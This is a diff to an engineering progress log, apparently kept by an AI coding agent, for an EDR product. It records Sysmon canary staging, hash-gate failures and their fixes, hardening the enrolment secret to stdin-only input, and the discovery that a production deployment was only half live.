+  from that run's SHA256SUMS.txt; C0 halts on mismatch. Sysmon binary integrity is gated on
+  the Authenticode signature (no pre-known hash exists in-repo); its SHA256 is recorded as
+  provenance for owner pinning.
+- Backend origin: https://nivxray.nivxforge.com only (production-origin guard).
+- Read credential: NIVX_CANARY_READ_TOKEN, never printed or stored.
+- No reboot required. Defender never weakened, no exclusions added.
+
+Guard hardened (canary script only, no product code): the `-Confirm` bypass was REMOVED from
+`scripts/canary/b5gap1_canary_load.ps1`. Load generation now requires all three: host not on
+the forbidden list, host named NVX-CANARY* OR on the explicit `$authorized` list (KUSHU), and
+an owner-written `C:\NivXForgeCanary\CANARY_DESIGNATION.json`. Test added; 122 passed / 2
+skipped for `-k "b5gap1 or b5_gap1"`.
+
+C0 block order (one at a time, each fail-closed, owner review between blocks):
+C0.1 designation + read-only preflight · C0.2 Sysmon staging + signature gate ·
+C0.3 config + apply + prove EID1/EID5 · C0.4 artifact SHA256 gate ·
+C0.5 install + enrol + service/journal/backend proof · C0.6 read-only collector dry sample.
+
+State: CANARY_STARTED = NO · LOAD_GENERATED = NO · DESKTOP_A9HGFJJ_TOUCHED = NO ·
+PRODUCTION_CHANGED = NO. C0.1 issued for owner review; nothing has been run.
+
+## 2026-06 · DEVICE TRAJECTORY CHECKPOINT 1 — PRELIMINARY READ-ONLY GAP LIST (no code change)
+
+Owner approved: KUSHU C0 -> canary -> B5-GAP-1 CLOSED -> Device Trajectory Checkpoint 1
+(structural/evidence-presentation parity only, PREVIEW ONLY) -> freeze -> E3/E4/E5/E6 ->
+Checkpoint 2 (intelligence surfaces). Owner explicitly REJECTED adding "ENGINE NOT PRESENT"
+labels to the frozen renderer: engine absence is recorded in the audit, the UI keeps showing
+backend truth.
+
+Produced `docs/DEVICE_TRAJECTORY_CHECKPOINT1_PRELIMINARY_GAPS.md` (read-only):
+- §A 18 structural rows located in code, classified PASS_PENDING_VISUAL (owner's side-by-side
+  decides parity; no parity claimed from code reading).
+- §B 10 proven divergences: B2 coverage bands NOT RENDERED although `CoverageInterval` +
+  `dt2/density.js::coverageOf` exist (P0 for an evidence-truth product); B5 no RAW payload
+  surface though `GET /api/edr/events/{raw_id}` exists (pure wiring); B1 inspector fixed at
+  394 px, not resizable; B7 `dt2/repeatCache.js` has no consumer -> owner ruling needed on
+  Cisco's per-file event cache (display suppression would hide held observations); B3 no
+  keyboard handling; B4 match count but no MATCH n OF m cursor; B6 no per-process
+  de-selection; B8 PID surrogate identity vs Cisco SHA-256; B9 dashed-open lifelines are
+  correct and KUSHU's EID 5 will exercise closed lifelines for the FIRST time; B10 Back does
+  not step investigation states.
+- §C 7 surfaces NOT_EVALUABLE_YET (E3 detections, E4 reputation/IOC, E5 contributor halo,
+  E6 ATT&CK, typed relationship edges awaiting real artefact evidence).
+- §D Checkpoint 1 preconditions: canary PASS, then a DECLARED benign CANARY/VALIDATION
+  density pass on KUSHU (EID 1/5/3/11/22, zero fabricated findings, run AFTER the canary
+  result so it cannot contaminate acceptance), preview-only, screenshot pairs per row.
+
+State: DEVICE_TRAJECTORY_CODE_CHANGED = NO · FIXES_APPLIED = NO · PRODUCTION_UI_DEPLOYED = NO
+· FIXTURES_ADDED = NO · CANARY_STARTED = NO · DESKTOP_A9HGFJJ_TOUCHED = NO.
+Active gate unchanged: KUSHU C0.1 -> B5-GAP-1 disposable canary.
+
+### 2026-06 · OWNER CORRECTION + RULINGS (recorded, NOT authorised for implementation)
+- Device Trajectory is NOT blocked on KUSHU. Two independent tracks now:
+  Track A = B5-GAP-1 on KUSHU (C0.1 -> C0.x -> stress scenarios -> close canary);
+  Track B = Device Trajectory structural/Cisco-parity evaluation over DESKTOP-A9HGFJJ's
+  existing canonical observations, which is a READ-ONLY projection (no endpoint contact,
+  no sensor restart, no Sysmon change). KUSHU later adds EID5 closed lifelines + the new
+  journal/acquisition architecture proof.
+- B7 RULING: collapse repeated equivalent events VISUALLY ONLY, never discard. Explicit
+  count (e.g. x17); expanding must expose every underlying observation with its
+  observation_id and timestamp. Ingest- or query-level suppression is NOT authorised.
+- B5 CONFIRMED P1: canonical observation -> original/raw evidence view (wiring over the
+  existing GET /api/edr/events/{raw_id}).
+- B2 coverage visualisation affirmed as important: absent coverage must be visually
+  distinct from "observed and nothing happened".
+- NOTHING authorised for implementation yet. Gap inventory is sufficient for now.
+  DEVICE_TRAJECTORY_CODE_CHANGED = NO · FIXES_APPLIED = NO · PRODUCTION_UI_DEPLOYED = NO.
+- Lifecycle: B5 = PASS · B5-GAP-1 implementation = PASS · Windows artifact = PASS ·
+  disposable canary = PENDING · Device Trajectory = foundation exists, gap audit complete,
+  fixes not accepted · E3-E6 = pending after the canary.
+- WORDING CORRECTION (owner): do NOT state that Cisco "destroys/discards" repeated events.
+  Sourced fact is only that Cisco documents a per-file event CACHE preventing another event
+  from being TRIGGERED within the window, and that its trajectory reads comparatively
+  sparse/collapsed. No documentation exists that its backend discards recorded events.
+  NivXForge requirement stays deliberately stronger: visual collapse only, underlying
+  observations intact and individually retrievable. Corrected in the B7 audit row.
+
+### 2026-06 · KUSHU C0.3 PREP (C0.1/C0.2 PASS; config staged in repo, nothing applied)
+- C0.1 = PASS, C0.2 = PASS (Sysmon 15.22, zip SHA256 00ECF1B4..., Sysmon64 SHA256 83D31F24...,
+  Authenticode Valid / Microsoft Windows Publisher; staged, NOT installed).
+- Created the repository-authoritative canary config:
+  `agents/nivxforge-windows/sysmon/nivx-b5gap1-canary-sysmon.xml` = the W1 baseline
+  (memory/W1_PHASE1_WINDOWS_LAPTOP_PREP.md §1.3) with ONLY the B5-validated token swap
+  `<ProcessTerminate onmatch="include"/>` -> `<ProcessTerminate onmatch="exclude"/>` (EID 5 ON).
+  No new XML was invented. Stale "LOG NOTHING" comment left byte-faithful on purpose.
+  Pinned hashes (UTF-8, no BOM): CRLF 452E331298DF9A3DF3314E2CF707F153891DCE0BCE625B4EE99548D8D5E479AB
+  / LF 60F585860CFBEA3D62888B6CCB90C15F28A49D91832D4FC4526EBEEAA316C67C.
+- `docs/B5_GAP_1_CANARY_PLAN.md` §0: C0.3 SPLIT into C0.3a (stage + validate, no install) and
+  C0.3b (apply + prove EID1/EID5 live), so rules are owner-reviewed before the driver loads them.
+- 3 new tests pin the config hash, assert EID1/EID5 ON, assert every DSM-unsupported event id
+  stays OFF, assert no rule carries children, and assert the one-token derivation from W1.
+  `test_b5gap1_canary_harness.py` = 23 passed.
+- Sysmon has no offline config validator, so C0.3a validation is XML + rule level; live rule
+  proof happens in C0.3b.
+- State: SYSMON_INSTALLED = NO · SYSMON_CONFIG_APPLIED = NO · NIVXFORGE_INSTALLED = NO ·
+  ENROLLED = NO · LOAD_GENERATED = NO · DEFENDER_MODIFIED = NO ·
+  DESKTOP_A9HGFJJ_TOUCHED = NO · PRODUCTION_CHANGED = NO · CANARY_STARTED = NO.
+- C0.3a PATH CORRECTION (owner review caught it before execution): C0.2 as executed staged
+  Sysmon at C:\NivXForgeCanary\stage\sysmon\Sysmon64.exe (zip at ...\stage\Sysmon.zip), NOT
+  C:\NivX\sysmon. Path contract now recorded in docs/B5_GAP_1_CANARY_PLAN.md §0: staged binary
+  is the source of truth; C0.3a explicitly creates C:\NivX\sysmon, re-verifies the staged
+  SHA256 against 83D31F2478DC6716CFDBF69E5C384BF043072B5F0D8D7B2EEA365F709FDA4352, copies the
+  binary, then re-hashes and re-verifies Authenticode on the COPY, and creates the directory
+  before writing the XML. Repository-authoritative XML and its pinned hashes unchanged.
+- C0.3a HALTED on KUSHU at the config hash gate (correct, fail-closed; Sysmon never
+  installed). Diagnosis: KUSHU file 1851 CRLF bytes vs repo artifact 1842 CRLF-equivalent
+  (1810 LF) -> +9 CONTENT bytes with identical line-ending counts and no BOM, so NOT a
+  newline/BOM issue. Root cause class: the block embedded a hand-copied PowerShell here-string
+  literal - a second copy of an artifact that is supposed to be authoritative - transported
+  through chat + a console paste, which is not byte-safe. The artifact has exactly ONE
+  non-ASCII character (U+00B7 MIDDLE DOT, 0xC2 0xB7, line 2). The observed hash was NOT
+  blessed.
+- Fix: added `agents/nivxforge-windows/sysmon/nivx-b5gap1-canary-sysmon.xml.b64` (pure-ASCII
+  base64 of the exact repository bytes). C0.3a recovery decodes it with
+  [Convert]::FromBase64String + WriteAllBytes, so KUSHU's file is BYTE-IDENTICAL to the repo
+  artifact and the single gate is the repository file hash
+  60F585860CFBEA3D62888B6CCB90C15F28A49D91832D4FC4526EBEEAA316C67C. The CRLF hash
+  452E3312...E479AB is retained as documentation only, no longer a gate. Rejected file is
+  preserved as REJECTED-*.xml in the evidence dir, never deleted.
+- 3 new tests: base64 decodes byte-identical to the config and is pure ASCII; per-line byte
+  lengths pinned (used by the block's per-line diff to NAME the divergent line); the only
+  non-ASCII byte is the line-2 separator. test_b5gap1_canary_harness.py = 26 passed.
+- KUSHU state unchanged: SYSMON_INSTALLED = NO, CONFIG_APPLIED = NO, binaries still match
+  83D31F24..., NIVXFORGE_INSTALLED = NO, ENROLLED = NO, LOAD_GENERATED = NO,
+  DEFENDER_MODIFIED = NO, DESKTOP_A9HGFJJ_TOUCHED = NO, PRODUCTION_CHANGED = NO.
+- C0.3a-R = PASS on KUSHU. Config byte-identical to the repo artifact
+  (60F585860CFBEA3D62888B6CCB90C15F28A49D91832D4FC4526EBEEAA316C67C, 1810 bytes, no BOM),
+  EID1/EID5 ENABLED, 0 child filters, Sysmon NOT installed. Rejected 1851-byte literal
+  preserved (94306BC7...403DA); per-line diagnosis showed divergence on lines 22-30, proving
+  the hand-copied-literal root cause. The expected hash was never changed to force a pass.
+- C0.3b acceptance definition recorded in docs/B5_GAP_1_CANARY_PLAN.md §0: pre-exec binary
+  re-verify, pre-apply config re-verify, install on canary only, service/driver/channel proof,
+  SHA256 of the driver's active Rules blob (HKLM\...\SysmonDrv\Parameters\Rules) as the only
+  authoritative "same rules" comparator, one benign uniquely-marked process, genuine EID 1,
+  genuine EID 5 for the SAME ProcessGuid, correlation on ProcessGuid (PID asserted additionally,
+  never instead), EventRecordID/UTC/Image/ProcessId/ProcessGuid preserved, fail closed,
+  rollback path stated. C0.3b block issued for owner review; NOT executed.
+- C0.3b attempt 1 = NOT_PASSED, KUSHU stayed CLEAN (no service, no driver, no channel, no
+  driver parameters, 0 Sysmon events; binary + config hashes unchanged). ROOT CAUSE: the block
+  used `& $bin -accepteula -i $cfg 2>&1 | Out-String` under $ErrorActionPreference='Stop';
+  PowerShell converts native stderr into error records, so the merged stream raised
+  NativeCommandError and terminated the script BEFORE $LASTEXITCODE was read. Sysmon writes
+  its banner to stderr even on success, so the script aborted at the invocation and no install
+  was attempted. NO repository code or config changed; XML and all pinned hashes untouched.
+- FIX (capture mechanism only, no acceptance condition weakened): binding native-invocation
+  rule recorded in docs/B5_GAP_1_CANARY_PLAN.md §0 - every native call goes through
+  Invoke-NativeCaptured (Start-Process -Wait -PassThru with stdout/stderr redirected to files),
+  giving the real exit code and both streams; non-zero still halts. C0.3b-R issued for owner
+  review, not executed.
+- C0.3b-R = PASS on KUSHU. Sysmon 15.22 installed (exit 0), service Running, SysmonDrv present,
+  channel enabled, ACTIVE_RULES_SHA256 = C134F0F3046A2D1690C42CBE682C251DC11C18F01D9BEF7B5B4B15EFF75BC384
+  (480 bytes, driver Rules blob - NOT the file hash). FIRST observed closed process lifetime in
+  this system: cmd.exe pid 34300, EID1 record 3991 @06:17:14.768Z -> EID5 record 4005
+  @06:17:14.857Z (~89 ms), SAME ProcessGuid {7446d477-a96a-6abc-f215-00000000aa00}, correlated on
+  ProcessGuid with PID asserted additionally => PROCESS_TERMINATION_OBSERVED. This will later
+  exercise the Device Trajectory closed-lifeline path instead of END_NOT_OBSERVED.
+- C0.4 BLOCKED ON OWNER INPUT: the authoritative ARTIFACT_SHA256 for NivXForgeEDRSetup.exe is
+  NOT retrievable from this container (it lives in Gate-0 run 36663297037's artifact /
+  GATE0_WINDOWS_REPORT.json / SHA256SUMS.txt; the owner's earlier paste omitted the value, and
+  grep confirms no 64-hex artifact hash exists anywhere in the repo or docs). It was NOT guessed.
+  C0.4 block issued parameterised: $EXPECTED_ARTIFACT_SHA256 must be filled from the Gate-0
+  evidence and the block HALTS on the unfilled placeholder - there is deliberately no
+  "accept observed" path. C0.4 is hash-gate + staging only; installation and enrolment remain
+  C0.5 per the canary plan. No execution of the artifact in C0.4.
+- C0.5 = HOLD by owner. BLOCKER = ENROLLMENT_TOKEN_COMMAND_LINE_EXPOSURE. The installer
+  accepted the one-time enrolment secret as `--token <plaintext>`, and Sysmon EID 1 records
+  process command lines, so the secret would have become endpoint telemetry delivered to the
+  backend it authenticates against. The interface was fixed instead of the procedure.
+- ENROLMENT SECRET IS NOW STDIN-ONLY (Windows only). `--token-stdin` is the sole accepted
+  input; `--token`/`-token`/`--enrollment-token`/`--enrolment-token` and any argv element with
+  the `nvxenr_` shape are REFUSED before argparse can echo them. The secret is never written to
+  disk, printed, or placed on any command line the installer builds (service binPath carries
+  --backend/--interval/--state-dir only). A rejected enrolment is redacted and re-raised OUTSIDE
+  the except block, so no `__context__` retains the value. `Install-NivXForgeSensor.ps1` takes a
+  SecureString and delivers it on the child's stdin (ZeroFreeBSTR after use).
+  Files: agents/nivxforge-windows/{nivxforge_sensor.py,nivxforge_setup.py,Install-NivXForgeSensor.ps1},
+  .github/workflows/windows-sensor-installer.yml, docs/B5_GAP_1_ENROLMENT_SECRET_STDIN.md,
+  docs/B5_GAP_1_CANARY_PLAN.md, backend/tests/edr/test_b5gap1_enrolment_secret_stdin.py (+3
+  existing installer test files updated). 24 new tests; full tests/edr suite 1979 passed.
+  LIVE argv proof on this pod via /proc/<pid>/cmdline of a real child process.
+- STILL OWED (cannot be produced from this container: no push rights, no Actions dispatch):
+  commit SHA, windows-sensor-installer run ID, new NivXForgeEDRSetup.exe SHA256, signing status.
+  Gate-0 artifact for commit 2cb841db10e4262bba89c115bfa8c3058f61fda4 left UNTOUCHED. KUSHU and
+  DESKTOP-A9HGFJJ not touched. Sysmon/Defender unchanged. E3 not started. C0.5 stays HOLD until
+  the NEW artifact is owner-reviewed and a new artifact-hash gate passes; the real Sysmon EID 1
+  absence check is specified in docs/B5_GAP_1_ENROLMENT_SECRET_STDIN.md §6.
+- DECLARED RESIDUAL: agents/nivxforge-linux/nivxforge_sensor.py still accepts `enrol --token
+  <secret>` (scripts/nivxforge_sensor_supervise.py passes it that way), so the same exposure
+  exists on Linux endpoints. OUT OF SCOPE of this directive, NOT fixed, recorded as open.
+- enr_ PREFIX GAP FIXED (owner-approved second build cycle). The argv secret-shape heuristic
+  checked only `nvxenr_`; the platform mints `enr_<token_urlsafe(32)>`
+  (edr_plane/enrollment/security.py PREFIX_ENROLLMENT="enr"), so it could not fire for a real
+  token. Named-flag refusals were always correct. Now: ENROLMENT_SECRET_PREFIXES = ("enr_",
+  "nvxenr_"), single decision point looks_like_enrolment_secret(), whole argv scanned (a secret
+  behind an UNKNOWN flag is refused too). Windows workflow now probes the FROZEN BINARY three
+  ways: localhost origin guard, `--token x` must be refused with "is REMOVED", and
+  `--provisioning-key=enr_ci_probe...` must be refused with "looks like an enrolment secret".
+  Tests: 37 in test_b5gap1_enrolment_secret_stdin.py (production + legacy shapes x 8 argv
+  placements); full tests/edr = 1993 passed, 3 skipped.
+- ARTIFACT 16c82fcafd6aec30039e64f385672f7b803c391c / run 36689911602 / SHA256 DA33A54E...C300
+  is OBSOLETE for C0.5 and MUST NOT BE EXECUTED. Staged copy on KUSHU left in place, unexecuted.
+  A NEW artifact + NEW hash gate is required before C0.5.
+- ENROLMENT TOKEN MINT PROCEDURE (read-only inspection, nothing minted): POST
+  /api/edr/enrollment/tokens (routers/edr_enrollment.py:94) with platform-user JWT +
+  Depends(edr_tenant) and X-Tenant-Id; body {label, ttl_seconds 60..86400}. Plaintext returned
+  ONCE, never stored (digest only), never re-readable. Single-use burned atomically by
+  consume_enrollment_token(); TTL default EDR_ENROLLMENT_TOKEN_TTL_SECONDS (900s in this pod;
+  the DEPLOYED value governs). Console path: /xdr/admin/edr-enrollment (adminMeta key
+  edr-enrollment). Canary tenant id must come from GET /api/xdr/tenants (needs tenants.read) or
+  the console selector - there is no hardcoded tenant anywhere by design.
+- LINUX ARGV EXPOSURE remains SEPARATE P0 SECURITY DEBT (agents/nivxforge-linux enrol --token,
+  scripts/nivxforge_sensor_supervise.py). Deliberately NOT in this change's scope.
+- PHASE 0 DEPLOYMENT & ENROLLMENT FOUNDATION (owner-directed, 2026-06). Delivered:
+  docs/NIVXFORGE_DEPLOYMENT_ENROLLMENT_ARCHITECTURE.md (15 sections: inventory, industry
+  pattern, authoritative model, EDR + XDR lifecycles, credential/identity/policy/health/
+  offboarding/audit models, UI IA, invariants, gap matrix, phased plan).
+- AUDIT HEADLINE: the control plane is far more complete than the "token generator" screen
+  suggests. EXISTS_AND_AUTHORITATIVE: tenant registry/orgs, PLATFORM vs CUSTOMER authority,
+  bootstrap token (single-use/TTL/atomic burn/digest-at-rest), per-device agent_credential +
+  rotate/revoke, endpoint identity (hostname is metadata), inventory, policies+versions+11-state
+  lifecycle, groups, GROUP-BOUND DEPLOYMENT CONTEXT (routers/edr_connector.py::create_deployment
+  binds group_id/release_id to the minted token; edr_enrollment.py:298-311 honours it =
+  Cisco-style group-in-package without touching the artifact), release catalog + SHA256,
+  telemetry acceptance, SensorState, acquisition integrity, canonical evidence, audit,
+  xdr_data_sources + xdr_collectors + normalization.
+  MISSING: tags; route to move an endpoint between groups; composed READY verdict; one unified
+  Deployment & Enrollment surface. PARTIAL: deployment PROFILE (only one-shot context),
+  heartbeat->health composition, rejected-sensor alarm surfacing, offboarding, clone handling.
+- NEW P0 GAP FOUND, NOT CHANGED (out of approved scope): create_deployment still returns a
+  Windows invocation string `-EnrollmentToken <ENROLLMENT_TOKEN>`, contradicting the mandatory
+  stdin-only contract. Needs owner decision. Other P0s: no composed READY verdict; clone
+  collision (two hosts one machine_guid) has no signal/policy; Linux argv exposure (existing).
+- B8-SCOPE-1 REPAIR IMPLEMENTED (additive, no predicate changed):
+  backend/routers/xdr_scope.py::authorized_scope now publishes `authorized_tenants` =
+  ctx["authorized_customers"] (AUTHORITY) alongside unchanged `tenants` (EVIDENCE/incident
+  corpus with open_incidents). Frontend: XdrScopeNavigator.jsx offers authorized_tenants and
+  uses `tenants` only for the "N open" annotation ("no XDR incidents" when absent);
+  AdminTenantGate.jsx offers authorized_tenants + auto-adopts a single authorised tenant.
+  Tests: backend/tests/test_b8_scope_authorized_tenants_contract.py (11 tests, A-H matrix)
+  = 11 passed; tests/test_a05_tenant_scope_contract.py 72 passed (no regression).
+  NOT DEPLOYED - production still shows the defect until the owner authorises a deploy.
+- C0.5 STILL BLOCKED. Installer SHA256 FE05C4A8E7246DBBB6D9850F9C4B80DDBFECE3175770B30D4A373D95FA6EDB7B
+  staged on KUSHU, NOT executed. Intended tenant: "NivXForge Canary", kind LAB - NOT CREATED.
+  Sequence agreed: deploy repair -> verify selector -> create LAB tenant -> mint ONE token ->
+  C0.5 -> Sysmon EID1 absence check.
+- P0 ENROLMENT-INSTRUCTION CONTRADICTION CLOSED (pre-deployment, owner-directed).
+  Root cause: three surfaces each composed their own Windows instruction and drifted.
+  routers/edr_connector.py::create_deployment INTERPOLATED THE MINTED PLAINTEXT into
+  `install_invocation` (`-EnrollmentToken <secret>`); routers/edr_onboarding.py PACKAGES
+  taught `-EnrollmentToken <token>` (ps1) and `--token <enrollment-token>` (exe, which the
+  hardened binary now refuses); EdrAddDevicePage.jsx rebuilt the same argv command in the
+  browser with the real token.
+  Fix: NEW single authority backend/edr_plane/enrollment/instructions.py
+  (windows_exe_invocation = Read-Host -AsSecureString -> BSTR -> pipe -> --token-stdin ->
+  ZeroFreeBSTR; windows_script_invocation = SecureString via @args SPLATTING so no
+  -EnrollmentToken pair is ever typed; linux_invocation UNCHANGED and declared as debt;
+  ARGV_SECRET_FORMS + WINDOWS_SECRET_CONTRACT exported for tests/UI).
+  install_invocation is now SECRET-FREE; response adds install_invocation_carries_secret=False
+  and secret_handling. EdrDownloadsPage.jsx shows the secret in its OWN CopyBlock
+  (edr-deployment-secret) and labels the command "carries NO secret".
+  Tests: backend/tests/test_w1_windows_enrolment_instruction_contract.py (13, W1-W7) = 13 passed.
+  Regression: 112 passed across onboarding/p0prod2/windows-installer/stdin suites.
+  PRE-EXISTING unrelated failures (proven by git stash, not caused here):
+  test_edr_onboarding_v1.py::test_the_package_catalog_reports_only_what_exists_on_disk expects
+  sensor_version 0.1.0-windows but the sensor is 0.3.0-windows; and
+  ::test_protection_never_claims_enforcement_the_sensor_cannot_do (lifecycle.assigned False).
+- NEXT IDENTITY P0 (owner-elevated, AFTER KUSHU acquisition closure, BEFORE broader UI work):
+  CLONE COLLISION - two hosts sharing a machine_guid silently merge into one endpoint_id,
+  which can corrupt Device Trajectory, detections, policy state, response targeting and
+  evidence attribution. Needs identity-semantics design, not a quick patch.
+- STILL NOT DEPLOYED. Awaiting final owner deployment authorization for the combined
+  selector + enrolment-instruction patch.
+- PRE-DEPLOYMENT KNOWN-RED CLOSURE (test-only, no production behaviour changed).
+  F1: routers/edr_onboarding.py::_sensor_version reads SENSOR_VERSION from the SHIPPED
+  agents/nivxforge-windows/nivxforge_sensor.py = "0.3.0-windows" (authoritative). The test's
+  hardcoded "0.1.0-windows" was stale. Replaced with a comparison against that authoritative
+  source + a shape check, so it cannot go stale again and still fails if catalog and artifact
+  disagree. Sensor version NOT altered.
+  F2: GATE 5 moved policy_lifecycle.assigned onto the policy authority's own record
+  (policy_state.assigned_policy_id); the test asserted assigned is True merely because a
+  policy OBJECT was passed - the exact configuration-implies-assignment conflation the
+  invariant forbids. Production is CORRECT and stricter: with no policy_state evidence,
+  assigned=False. Test updated to assert that, plus a NEW test proving
+  ASSIGNED != DELIVERED != ACKNOWLEDGED != APPLIED != VERIFIED != ENFORCED (enforced is
+  hardcoded False because the released connector enforces nothing). No production code touched.
+  Scoped regression: 187 passed, 0 failed (onboarding, W1 instruction contract, B8 selector,
+  A0.5 tenant authority, p0prod2 enrollment hardening, stdin secret, exclusion scope).
+  BASELINE IS NOW CLEAN for the deployment gate.
+- PRODUCTION DEPLOY DISPATCHED (owner-authorized) for the combined changeset: B8 selector
+  repair + centralized Windows stdin-only enrolment instruction authority + the 4 closed argv
+  secret paths + frontend + test-only known-red closure. Backend and frontend MUST ship
+  together (new frontend reads a field the old backend does not send; old frontend would keep
+  composing an argv command with a live secret). No migration, no data mutation.
+  Deploy job id 95e7e8cd-6528-4f50-8702-566d0dc3b0ce. Awaiting pipeline outcome.
+  AFTER acceptance passes (8 read-only checks) and ONLY on owner review: create NivXForge
+  Canary (LAB) -> mint ONE token -> KUSHU C0.5. UI/UX baseline audit to precede any broader
+  UI redesign decision (owner sequencing note); it does NOT block the LAB tenant or KUSHU.
+  Recorded, non-blocking: GATE 5 policy lifecycle needs its own test suite before the
+  composed READY phase.
+- PRODUCTION ACCEPTANCE (Publish 100) = FAIL AT GATE 0. Read-only evidence:
+  * PRODUCTION TOPOLOGY DISCOVERED: xdr.nivxforge.com and edr.nivxforge.com are BOTH served by
+    VERCEL (`server: Vercel` response header) from apps/nivxray-xdr (it has .vercel/ +
+    vercel.json). The Emergent publish pipeline builds /app/frontend, NOT apps/nivxray-xdr.
+    The production BACKEND is https://nivxray.nivxforge.com (healthy: /api/health 200,
+    unauth GETs correctly 403).
+  * THE REVIEWED FRONTEND IS NOT LIVE. Deployed bundles fetched and inspected:
+    xdr.nivxforge.com XdrShell-CxJL9WXQ.js contains "authorized_count" but NOT
+    "authorized_tenants"; EdrAddDevicePage-DJayq9b7.js still contains "EnrollmentToken";
+    EdrDownloadsPage-B9DnrKlR.js lacks "carries NO secret". edr.nivxforge.com is a SEPARATE,
+    also-old Vercel build (XdrShell-LH9QX3xl.js, EdrAddDevicePage-CDkw308R.js — same findings).
+    => the two consoles are two independent Vercel deployments, both pre-change.
+  * CONSEQUENCE: even if the backend half shipped, the live consoles still read `tenants`
+    (selector stays empty) and EdrAddDevicePage still rebuilds the argv enrolment command in
+    the browser. This is the owner's "backend/frontend versions are incompatible" STOP
+    condition. No workaround attempted, no code changed, no redeploy.
+  * BLOCKER 2: the production admin credential in the handoff (admin@nivxray.com) returns 401
+    at https://nivxray.nivxforge.com/api/auth/login - it is PREVIEW-ONLY. So checks 1, 5, 7
+    (authenticated GETs) and 2, 3 (UI) are NOT_VERIFIED. NOTE for future: routers/auth.py
+    login performs NO DB write (in-memory rate limiter only), so a login is not a data
+    mutation.
+  * Deployer agent asked (read-only, intent=debug) for publish number, both commit SHAs,
+    which frontend the pipeline builds, hostnames served, whether the deployed image contains
+    edr_plane/enrollment/instructions.py, pod health/ImportError, and Mongo binding. Response
+    pending at time of writing.
+  * TO FIX THE DEPLOYMENT GAP the owner must decide how apps/nivxray-xdr is released (Vercel
+    project rebuild from the new commit for BOTH hostnames) - that is a platform/release
+    decision, not a code change.
+- DEPLOYER RCA CONFIRMS (RCA_c0062f89-b97c-455a-9102-f893a9f00ccc.MD):
+  * Emergent deploy run c0062f89, live 2026-09-30T11:42:42Z UTC. No publish number and NO
+    commit SHA is recoverable - the pipeline packages a SOURCE SNAPSHOT, not a git checkout.
+  * DEPLOYED BACKEND CONTAINS ALL REVIEWED CHANGES: xdr_scope.py returns authorized_tenants;
+    edr_plane/enrollment/instructions.py exists and imports cleanly (NO ImportError);
+    edr_connector.py sets install_invocation_carries_secret=False. Backend healthy. Mongo
+    binding unchanged (DB greeting-app-5782-test_database, 95 collections). Build SUCCESS.
+  * EMERGENT BUILDS ONLY /app/frontend (CRA/craco) and serves greeting-app-5782.emergent.host
+    + nivxray.nivxforge.com. apps/nivxray-xdr (Vite) is NOT in the pipeline; xdr.nivxforge.com
+    and edr.nivxforge.com are Vercel (project prj_Pk0K..., host redirects in its vercel.json).
+    => the reviewed FRONTEND can only reach production via a SEPARATE Vercel re-publish of
+    apps/nivxray-xdr. Re-running the Emergent publish will NOT update those consoles.
+  * RELEASE-PATH DEBT (P0, owner decision): the approved changeset is HALF-LIVE. Production
+    backend is new, both production consoles are old. Until the Vercel re-publish happens the
+    XDR selector stays empty and EdrAddDevicePage still builds the argv enrolment command.
+  * Benign pre-existing prod noise confirmed: threatfox 401 (ABUSE_CH_AUTH_KEY), transient
+    warm-up /health timeouts.
+- RELEASE-PATH DISCOVERY (read-only, nothing changed). PROVEN:
+  * apps/nivxray-xdr = Vite app. vercel.json: installCommand `yarn install --production=false`,
+    buildCommand `bash scripts/vercel-build.sh`, outputDirectory `dist`, framework null,
+    SPA rewrite, host-based redirects (/ -> /xdr for xdr.nivxforge.com, / -> /edr for
+    edr.nivxforge.com).
+  * TWO VERCEL PROJECTS, one root directory, one build command, differentiated ONLY by env var
+    NIVX_PRODUCT_SCOPE (unset|xdr -> XDR host; edr -> EDR host). Documented in
+    scripts/vercel-build.sh. The scope var is load-bearing: without it ProductScopeGuard stops
+    working and either product can render on either host.
+  * LIVE PROVENANCE from each host's own /build-info.json (written by the build script):
+    xdr.nivxforge.com product_scope=xdr built_at 2026-09-26T18:19:37Z
+    edr.nivxforge.com product_scope=edr built_at 2026-09-26T18:20:24Z
+    both api_origin=https://nivxray.nivxforge.com, cross_product_origins=0.
+    47 seconds apart => two projects built back-to-back. Both predate the reviewed frontend
+    commits (3aeef2f2 2026-09-30 10:53Z, 5b968379 2026-09-30 11:09Z) by 4 days.
+  * APPROVED SOURCE: /app HEAD a3523a8891a086fa2e97a38ddea8492863195d3b contains ALL FOUR
+    frontend fixes with ZERO uncommitted drift.
+  * NESTED REPO TRAP: apps/nivxray-xdr has its OWN .git with remote
+    https://github.com/jpreddy017/nivxray-xdr.git, branch main, HEAD 6b1441c dated
+    2026-08-31, and that tree does NOT EVEN CONTAIN XdrScopeNavigator.jsx. It is ~1 month
+    stale and tracks the app at its own root (no apps/ prefix). /app has NO git remote
+    configured (Emergent-managed). Which repo the Vercel projects build from is NOT provable
+    from the repo: the Root Directory comment implies the monorepo, the nested remote implies
+    the standalone repo. NOT INFERRED - owner must read the Vercel dashboard.
+  * apps/nivxray-xdr/.env is git-tracked and points REACT_APP_NIVXRAY_API_URL at the PREVIEW
+    backend BY DESIGN; vercel-build.sh overrides it with XDR_PROD_API_ORIGIN (default
+    https://nivxray.nivxforge.com) as a real env var, and scripts/verify-production-build.js
+    guards the artifact. Do not "fix" that .env.
+  * No GitHub workflow in this repo deploys Vercel - the trigger is Vercel's own Git
+    integration or a manual `vercel --prod`.
+  * PRODUCTION AUTH = BLOCKED. Mechanism: POST /api/auth/login, bcrypt against users.password
+    in the production DB, JWT signed with production JWT_SECRET; no SSO; a
+    must_change_password gate exists. Owner must supply a valid production PLATFORM password
+    (or run the GETs). I will NOT retry the invalid credential.
+- VERCEL RELEASE RECONCILIATION (read-only; fetched the two production branches from GitHub):
+  * github.com/jpreddy017/nivxray-xdr holds the MONOREPO (both prod branches contain agents/,
+    backend/, apps/...). Not a standalone app repo.
+  * release/xdr-w1-candidate HEAD 9ae7bdac 2026-09-18 08:44Z "Auto-generated changes"
+    phase2/edr-production     HEAD e9d71354 2026-09-09 11:48Z "Auto-generated changes"
+    ON BOTH BRANCHES ALL FOUR REVIEWED FILES ARE ABSENT ENTIRELY - not stale versions,
+    the files do not exist: XdrScopeNavigator.jsx, AdminTenantGate.jsx, EdrAddDevicePage.jsx,
+    EdrDownloadsPage.jsx. Both branches are weeks behind.
+  * LIVE artifacts are built 2026-09-26T18:19/18:20Z = NEWER than both branch HEADs and DO
+    contain EdrAddDevicePage/EdrDownloadsPage chunks + /build-info.json (written ONLY by
+    scripts/vercel-build.sh). => the live production deployments were NOT built from these
